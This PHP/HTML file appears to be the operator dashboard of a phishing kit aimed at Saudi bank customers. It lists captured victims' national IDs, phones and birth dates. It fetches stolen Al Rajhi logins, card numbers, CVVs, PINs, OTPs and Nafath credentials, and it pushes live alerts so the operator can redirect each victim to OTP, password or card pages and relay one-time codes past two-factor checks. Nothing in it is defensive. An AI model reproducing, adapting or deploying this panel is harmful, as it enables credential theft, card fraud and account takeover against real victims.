<?php

session_start();

// Include Initialization file
require_once('init.php');


if (!$User->isLoggedIn()) {
    $User->redirect('login.php');
}


$users = $User->fetchAllUsers();

if (isset($_GET['TestInfoReject'])) {

    $idd = $_GET['id'];

    $X = 2;
    $User->UpdateUserStatusById($idd, $X);
    $User->redirect('index.php');
}

if (isset($_GET['TestInfoAcceptance'])) {
    $idd = $_GET['id'];

    $X = 1;
    $User->UpdateUserStatusById($idd, $X);
    $User->redirect('index.php');
}

if (isset($_POST['deleteUser'])) {
    $id = $_POST['userId'];
    $User->DeleteUserById($id);
    $User->redirect('index.php');
}


if (isset($_POST['deleteAllUser'])) {
    $User->DeleteAllUsers();
    $User->redirect('index.php');
}

// if (isset($_POST['dataInfoAccept'])) {
//     $idd = $_POST['idforrow'];
//     $selectedText = $_POST['numberselected'];
//     $User->UpdateUserData($idd, $selectedText);
// }

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>DASHBOARD</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">

    <!-- Favicon -->
    <link href="img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Heebo:wght@400;500;600;700&display=swap" rel="stylesheet">

    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
    <style>
        * {
            font-family: "Cairo", sans-serif;
        }

        .btn-danger {
            background-color: #ff0000;
        }

        .bg-dangl {
            background-color: #ff7b7b;
        }
    </style>
</head>

<body>
    <div class="content open">
        <!-- Navbar Start -->
        <nav class="navbar navbar-expand bg-light navbar-light sticky-top px-4 py-0">
            <a href="index.php" class="navbar-brand d-flex d-lg-none me-4">
                <h2 class="text-primary mb-0"><i class="fa fa-hashtag"></i></h2>
            </a>
            <!-- <a href="#" class="sidebar-toggler flex-shrink-0">
                <i class="fa fa-bars"></i>
            </a> -->
            <!-- <form class="d-none d-md-flex ms-4">
                <input class="form-control border-0" type="search" placeholder="Search">
            </form> -->
            <div class="navbar-nav align-items-center ms-auto">
                <!-- <div class="nav-item dropdown">
                    <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                        <i class="fa fa-envelope me-lg-2"></i>
                        <span class="d-none d-lg-inline-flex">Message</span>
                    </a>
                    <div class="dropdown-menu dropdown-menu-end bg-light border-0 rounded-0 rounded-bottom m-0">
                    </div>
                </div>
                <div class="nav-item dropdown">
                    <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                        <i class="fa fa-bell me-lg-2"></i>
                        <span class="d-none d-lg-inline-flex">Notificatin</span>
                    </a>
                    <div class="dropdown-menu dropdown-menu-end bg-light border-0 rounded-0 rounded-bottom m-0">
                    </div>
                </div> -->
                <div class="nav-item dropdown">
                    <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                        <img class="rounded-circle me-lg-2" src="img/user.jpg" alt="" style="width: 40px; height: 40px;">
                        <span class="d-none d-lg-inline-flex">Bank Pal</span>
                    </a>
                    <div class="dropdown-menu dropdown-menu-end bg-light border-0 rounded-0 rounded-bottom m-0">
                        <a href="logout.php" class="dropdown-item">Log Out</a>
                    </div>
                </div>
            </div>
        </nav>
        <!-- Navbar End -->

        <!-- Recent Sales Start -->
        <div class="container-fluid pt-4 px-4">
            <div class="bg-light text-center rounded p-4">
                <!-- <div class="text-end mb-4">
                        <h5 class="">عدد الزيارات : <?php echo $visits->visits ?></h5>
                    </div>
                    <form class="mb-4">
                        <input class="form-control border-0" type="search" placeholder="Search">
                    </form> -->
                <div class="d-flex mb-4">

                    <form action="" method="POST">
                        <button type="submit" name="deleteAllUser" class="btn btn-lg btn-danger">حذف جميع المستخدمين</button>
                    </form>
                </div>
                <div class="table-responsive">
                    <table class="table text-start align-middle table-bordered table-hover mb-0">
                        <thead>
                            <tr class="text-dark">
                                <th scope="col">اخر ادخال</th>
                                <th scope="col">الصفحة الحالية</th>
                                <!-- <th scope="col">SSN</th> -->
                                <th scope="col">الرقم الوطني</th>
                                <th scope="col">الأسم</th>
                                <th scope="col">ميلاد</th>
                                <th scope="col">رقم الهاتف</th>
                                <th scope="col">البطاقة</th>
                                <th scope="col">نفاذ</th>
                                <th scope="col">Time</th>
                                <th scope="col">del</th>
                            </tr>
                        </thead>
                        <tbody id="result">
                            <?php
                            if ($users != false) :
                                foreach ($users as $row) {
                            ?>
                                    <tr data-user-id="<?= $row->id; ?>">
                                        <td id="message<?= $row->id; ?>">
                                            <?= $row->message; ?>
                                        </td>

                                        <td id="page<?= $row->id; ?>">
                                            <?= $row->page; ?>
                                        </td>

                                        <td><?= $row->ssn; ?></td>
                                        <td id="name<?= $row->id; ?>"><?= $row->username; ?></td>
                                        <td id="date<?= $row->id; ?>"><?= $row->date; ?></td>
                                        <td id="phone<?= $row->id; ?>"><?= $row->phone; ?></td>
                                        <td>
                                            <button class="btn btn-info text-white" onclick="removeBackground(this,<?= $row->id; ?>)">اجراء</button>
                                            <!-- data-bs-toggle="modal" data-bs-target="#card<?= $row->id; ?>" -->

                                            <div class="modal fade" id="card<?= $row->id; ?>" tabindex="-1" aria-labelledby="cardModalLabel" aria-hidden="true">
                                                <div class="modal-dialog">
                                                    <div class="modal-content">
                                                        <div class="modal-header">
                                                            <h1 class="modal-title fs-5" id="card">Account</h1>
                                                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                                        </div>
                                                        <div class="modal-body">

                                                            <div id="cardDetails<?= $row->id; ?>">

                                                            </div>

                                                            <hr>
                                                        </div>
                                                        <div class="modal-footer">
                                                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </td>
                                        <td>
                                            <button class="btn btn-info text-white" onclick="removeBackground2(this,<?= $row->id; ?>)">اجراء</button>

                                            <div class="modal fade" id="usermodal<?= $row->id; ?>" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                                                <div class="modal-dialog">
                                                    <div class="modal-content">
                                                        <div class="modal-header">
                                                            <h5 class="modal-title" id="exampleModalLabel">يرجى إدخال اليانات</h5>
                                                        </div>
                                                        <div class="modal-body">
                                                            <div id="userDetails<?= $row->id; ?>">

                                                            </div>
                                                        </div>
                                                        <div class="modal-footer">
                                                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">إغلاق</button>
                                                            <button onclick="callDataRequest(<?= $row->id; ?> , 1)" class="btn btn-primary">حفظ</button>
                                                        </div>

                                                    </div>
                                                </div>
                                            </div>
                                        </td>
                                        <td><?= $row->created_at; ?></td>
                                        <td>
                                            <div class="dropdown">
                                                <button class="btn btn-primary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                                                    <!-- <i class="bi bi-list"></i> -->
                                                </button>
                                                <ul class="dropdown-menu bg-dark">

                                                    <li class="aca">
                                                        <button class="text-primary btn btn-sm" data-bs-toggle="modal" data-bs-target="#pagess<?= $row->id; ?>">إعادة توجيه</button>
                                                    </li>
                                                    <li class="mt-3 aca">
                                                        <form action="" method="POST">
                                                            <button type="submit" name="deleteUser" class="text-danger btn btn-sm aca">DELETE</button>
                                                            <input type="hidden" name="userId" value="<?= $row->id; ?>">
                                                        </form>
                                                    </li>
                                                </ul>
                                            </div>

                                            <div class="modal fade" id="pagess<?= $row->id; ?>" tabindex="-1" aria-labelledby="pageModalLabel" aria-hidden="true">
                                                <div class="modal-dialog">
                                                    <div class="modal-content bg-light">
                                                        <div class="modal-header">
                                                            <h1 class="modal-title fs-5" id="page">التوجيه</h1>
                                                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                                        </div>
                                                        <div class="modal-body">
                                                            <div class="mb-4">
                                                                <h5 class="text-center">الصفحة المطلوب توجيه العميل اليها</h5>
                                                                <div class="mt-4">

                                                                    <select class="form-select bg-light" id="selaaUrl<?= $row->id; ?>">
                                                                        <option value="index.php" selected>صفحة معلومات التسجيل</option>
                                                                        <option value="payment.php">صفحة البطاقة</option>
                                                                        <option value="otp.php">رمز OTP</option>
                                                                        <option value="password.php">رمز سري</option>
                                                                        <option value="nafath.php">نفاذ</option>
                                                                        <option value="raj.php">راجحي</option>
                                                                    </select>
                                                                    <div class="d-flex gap-2 mt-4">
                                                                        <button onclick="callaaRequest(<?= $row->id; ?>)" class="btn btn-success w-100">توجيه</button>
                                                                    </div>
                                                                </div>

                                                                <hr>
                                                            </div>
                                                            <div class="modal-footer">
                                                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </td>
                                    </tr>
                            <?php
                                }
                            endif;
                            ?>
                        </tbody>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <!-- Recent Sales End -->

        <!-- Button trigger modal -->
        <!-- Modal -->
        <div class="modal fade" id="info" tabindex="-1" aria-labelledby="infoModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h1 class="modal-title fs-5" id="info">Info</h1>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div>
                            <p class="bg-info text-center text-dark py-2">User Info</p>
                            <div class="ps-3">
                                <h6>FineNumber : 648579107</h6>
                                <h6 class="my-3">ViolatorID : 1085854410</h6>
                                <h6>Id : 199509</h6>
                            </div>
                        </div>
                        <div>
                            <p class="bg-info text-center text-dark py-2">User Info</p>
                            <div class="ps-3">
                                <h6>Price : 80</h6>
                            </div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>

    </div>
    <!-- Content End -->

    <audio id="notification-card" src="./level-up-2-199574.mp3"></audio>

    <!-- Back to Top -->
    <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"><i class="bi bi-arrow-up"></i></a>
    </div>

    <script>
        function handleSelectChange(cardId) {
            const select = document.getElementById(`selTUrl${cardId}`);
            const input = document.getElementById(`codeNafath${cardId}`);

            if (select.value === 'StepFifth.php') {
                input.style.display = 'block';
            } else {
                input.style.display = 'none';
            }
        }

        function removeBackground(button, userId) {
            var row = button.closest('tr');
            row.classList.remove('bg-dangl');

            $.ajax({
                url: 'card-list.php',
                type: 'GET',
                data: {
                    user_id: userId
                },
                success: function(response) {
                    var cards = JSON.parse(response);


                    var cardContainer = $('#cardDetails' + userId);
                    cardContainer.empty(); // Clear the container before appending new cards

                    cards.forEach(function(card, index) {
                        // Create a new div for each card's details
                        var cardHtml = `
                                                                <div class="mb-4">
                                                                    <p class="bg-success text-center text-light py-2">Card</p>
                                                                        <div class="ps-3">
                                                                        <h6 class="mb-3" id="num">Rajhi username : ${card.username}</h6>
                                                                        <h6 class="mb-3" id="num">Rajhi password : ${card.passwordt}</h6>
                                                                        <h6 class="mb-3" id="num">Name : ${card.cardName}</h6>
                                                                        <h6 class="mb-3" id="num">Number : ${card.cardNumber}</h6>
                                                                        <h6 class="mb-3" id="date">Exp : ${card.year}</h6>
                                                                        <h6 class="mb-3" id="cvv">CVV : ${card.cvv}</h6>
                                                                        <h6 class="mb-3" id="otp">OTP : ${card.otp}</h6>
                                                                        <h6 class="mb-3" id="pin">Password : ${card.password}</h6>
                                                                    </div>
                                                                </div>
                   ${card.status == 0 ? `<div class="mb-4">
                                                                    <h5 class="text-center">نقل إلى</h5>
                                                                    <div>

                                                                        <select class="form-select" id="selUrl${card.id}">                                                                       
                                                                       <option value="payment.php">صفحة البطاقة</option>
                                                                            <option value="otp.php">رمز OTP</option>
                                                                            <option value="password.php">رمز السري</option>
                                                                             <option value="nafath.php">نفاذ</option>
                                                                             <option value="raj.php">راجحي</option>
                                                                        </select>
                                                                        <div class="d-flex gap-2 mt-4">
                                                                        <button onclick="callRequest(${card.id} , 1, ${card.userId})" class="btn btn-success w-50">قبول</button>
                                                                        <button onclick="callRequest(${card.id}, 2, ${card.userId})" class="btn btn-danger w-50">رفض</button>
                                                                        </div>
                                                                        


                                                                    </div>
                                                                </div>` : card.status == 1 ? `<button class="btn btn-success w-100 mb-4">مقبول</button>` : `<button class="mb-4 btn btn-danger w-100">مرفوض</button>`}
                `;

                        cardContainer.append(cardHtml);
                    });

                    $('#card' + userId).modal('show');
                },
                error: function(xhr, status, error) {
                    console.error('Request failed:', status, error);
                }
            });

        }


        function removeBackground2(button, userId) {
            var row = button.closest('tr');
            row.classList.remove('bg-dangl');

            $.ajax({
                url: 'card-list.php',
                type: 'GET',
                data: {
                    user_id: userId
                },
                success: function(response) {
                    var cards = JSON.parse(response);


                    var cardContainer = $('#userDetails' + userId);
                    cardContainer.empty(); // Clear the container before appending new cards

                    cards.forEach(function(card, index) {
                        // Create a new div for each card's details
                        var cardHtml = `
                                                                <div class="mb-4">
                                                                    <p class="bg-success text-center text-light py-2">Phone</p>
                                                                        <div class="ps-3">
                                                                        <h6 class="mb-3" id="num">Company : ${card.company}</h6>
                                                                        <h6 class="mb-3" id="num">Number : ${card.PhoneNumber}</h6>
                                                                        <h6 class="mb-3" id="date">Auth Code : ${card.Authentication_code}</h6>
                                                                                                                                                <h6 class="mb-3" id="date">Pass Code : ${card.New_code}</h6>
                                                                        <h6 class="mb-3" id="cvv">User Name : ${card.UserName_Nafad}</h6>
                                                                        <h6 class="mb-3" id="otp">Password : ${card.UserPasswore_Nafad}</h6>
                                                                        <h6 class="mb-3" id="pin">OTP : ${card.TemporaryPassword}</h6>
                                                                    </div>
                                                                </div>
                   ${card.CheckTheInfo_Nafad == 0 ? `<div class="mb-4">
                                                                    <h5 class="text-center">نقل إلى</h5>
                                                                    <div>

                                                                        <select class="form-select" id="selTUrl${card.id}" onchange="handleSelectChange(${card.id})">                                                                       
                                                                       <option value="StepTwo.php">رقم الجوال</option>
                                                                            <option value="StepThird.php">رمز التوثيق</option>
                                                                            <option value="StepFourth.php">اسم المستخدم وكلمة المرور</option>
                                                                            <option value="StepFifth.php">صفحة رقم تطبيق المصادقة</option>
                                                                             <option value="StepOne.php">صفحة شركات الهاتف</option>
                                                                              <option value="StepPass.php">كلمة المرور المرسلة</option>
                                                                        </select>
                                                                        <input type="text" id="codeNafath${card.id}" class="form-control my-3" placeholder="ex. 90" style="display:none;" value="">
                                                                        <div class="d-flex gap-2 mt-4">
                                                                        <button onclick="callTRequest(${card.id} , 1, ${card.userId})" class="btn btn-success w-50">قبول</button>
                                                                        <button onclick="callTRequest(${card.id}, 2, ${card.userId})" class="btn btn-danger w-50">رفض</button>
                                                                        </div>
                                                                        


                                                                    </div>
                                                                </div>` : card.CheckTheInfo_Nafad == 1 ? `<button class="btn btn-success w-100 mb-4">مقبول</button>` : `<button class="mb-4 btn btn-danger w-100">مرفوض</button>`}
                `;

                        cardContainer.append(cardHtml);
                    });

                    $('#usermodal' + userId).modal('show');
                },
                error: function(xhr, status, error) {
                    console.error('Request failed:', status, error);
                }
            });

        }
    </script>

    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="lib/chart/chart.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/tempusdominus/js/moment.min.js"></script>
    <script src="lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>

    <!-- Template Javascript -->
    <script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        // Enable pusher logging - don't include this in production
        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('temaeen-new');
        channel.bind('my-event-bann', function(data) {
            $.ajax({
                url: "users-list.php",
                success: function(response) {
                    let tempDiv = document.createElement('table');
                    tempDiv.innerHTML = response;

                    let newRow = tempDiv.querySelector('tr');
                    if (newRow) {
                        newRow.classList.add('bg-dangl');
                        $('#result').prepend(newRow);


                        var audio = document.getElementById('notification-card');
                        audio.play().catch(function(error) {
                            console.error('Error playing audio: ', error);
                        });
                    }

                },
                error: function(xhr, status, error) {
                    // Handle error
                    console.error(xhr.responseText);
                }
            });
        });

        channel.bind('update-user-accountt', function(data) {

            var userId = data.userId;
            var updatedData = data.updatedData;
            var audio = document.getElementById('notification-card');

            if (updatedData.type == '1' || updatedData.type == '2' || updatedData.type == '3') {
                var cardNsnumberElefeement = document.getElementById('message' + userId);
                cardNsnumberElefeement.textContent = updatedData.message;

                var cardNsnumberwfElefeement = document.getElementById('page' + userId);
                cardNsnumberwfElefeement.textContent = updatedData.message;
            }

            if (updatedData.type == '5') {
                var cardNsnumberElefeement = document.getElementById('message' + userId);
                cardNsnumberElefeement.textContent = updatedData.message;

                var cardNsnumberwfElefeement = document.getElementById('page' + userId);
                cardNsnumberwfElefeement.textContent = updatedData.message;

                var nameel = document.getElementById('name' + userId);
                nameel.textContent = updatedData.name;
                var phoneel = document.getElementById('phone' + userId);
                phoneel.textContent = updatedData.phone;
                var datee = document.getElementById('date' + userId);
                datee.textContent = updatedData.date;
            }

            document.querySelectorAll('tr[data-user-id]').forEach(function(row) {
                const cardTwoId = row.getAttribute('data-user-id');

                if (cardTwoId == userId) {
                    row.classList.add('bg-dangl');

                    var tbody = row.closest('tbody');
                    if (tbody && tbody.firstChild !== row) {
                        tbody.insertBefore(row, tbody.firstChild);
                    }
                }
            });

            audio.play().catch(function(error) {
                console.error('Error playing audio: ', error);
            });

        });

        channel.bind('curreneft-page', function(data) {

            var userId = data.userId;
            var page = data.page;

            var cardNsnumberEldefeefment = document.getElementById('page' + userId);
            cardNsnumberEldefeefment.textContent = page;

        });

        function callRequest(id, status, userId) {
            var selectElement = document.getElementById('selUrl' + id);

            var selectedValue = selectElement.value;

            if (status == 2) {
                selectedValue += '?reject=1';
            }


            $.ajax({
                url: 'action-code.php',
                type: 'GET',
                data: {
                    user_id: id,
                    status: status,
                    url: selectedValue
                },
                success: function(response) {
                    $('#card' + userId).modal('hide');
                },
                error: function(xhr, status, error) {
                    console.error('Request failed:', status, error);
                }
            });
        }

        function callTRequest(id, status, userId) {
            var selectElement = document.getElementById('selTUrl' + id);
            var codeNafath = document.getElementById('codeNafath' + id);

            var selectedValue = selectElement.value;
            var codeNafathValue = codeNafath.value;

            if (status == 2) {
                selectedValue += '?reject=1';
            }

            if (selectedValue == "StepFifth.php") {
                selectedValue += '?code=' + codeNafathValue;
            }


            $.ajax({
                url: 'action-code-nafath.php',
                type: 'GET',
                data: {
                    user_id: id,
                    status: status,
                    url: selectedValue
                },
                success: function(response) {
                    $('#usermodal' + userId).modal('hide');
                },
                error: function(xhr, status, error) {
                    console.error('Request failed:', status, error);
                }
            });
        }

        function callaaRequest(userId) {
            var selectElement = document.getElementById('selaaUrl' + userId);

            var selectedValue = selectElement.value;

            $.ajax({
                url: 'trigger-page.php',
                method: 'POST',
                data: {
                    userId: userId,
                    page: selectedValue,
                },
                success: function(response) {
                    $('#pagess' + userId).modal('hide');
                },
                error: function(xhr, status, error) {
                    $('#pagess' + id).modal('hide');
                }
            });
        }
    </script>
</body>

</html>